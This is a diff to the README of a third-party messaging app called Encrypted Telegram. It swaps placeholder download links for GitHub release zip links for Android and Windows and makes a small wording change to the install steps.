@@ -16,8 +16,8 @@ Encrypted Telegram is a messaging application based on Telegram, providing end-t
 
 You can download the app for your preferred platform using the links below:
 
-- [Download for Android](https://example.com/android-download)
-- [Download for Windows](https://example.com/windows-download)
+- [Download for Android](https://github.com/secpap/Encrypted-Telegram/releases/download/Encrypted-Telegram/Telegram-Android.zip)
+- [Download for Windows](https://github.com/secpap/Encrypted-Telegram/releases/download/Encrypted-Telegram/Telegram-Windows.zip)
 
 ## Video Introduction
 
@@ -29,7 +29,7 @@ https://youtu.be/w8Rfv3yEx4Q
 
 1. Download the appropriate installer.
 2. Install the application on your device.
-3. Register or log in to your account.
+3. Register or login to your account.
 4. Start chatting with your friends.
 5. All messages are automatically encrypted, and the IP address of the other party is displayed in the chat window.
 
